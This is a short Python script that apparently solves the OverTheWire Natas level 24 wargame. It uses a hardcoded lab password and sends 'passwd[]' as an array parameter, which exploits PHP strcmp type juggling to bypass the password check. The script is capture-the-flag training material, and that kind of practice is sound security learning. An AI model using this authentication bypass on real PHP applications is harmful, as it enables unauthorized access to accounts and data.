import requests

user = 'natas24'
password = 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd'
url = 'http://natas24.natas.labs.overthewire.org'

passwd = 0 
params = {'passwd[]' : passwd}

response = requests.get(url = url, auth=(user, password), params=params)

print(response.text)
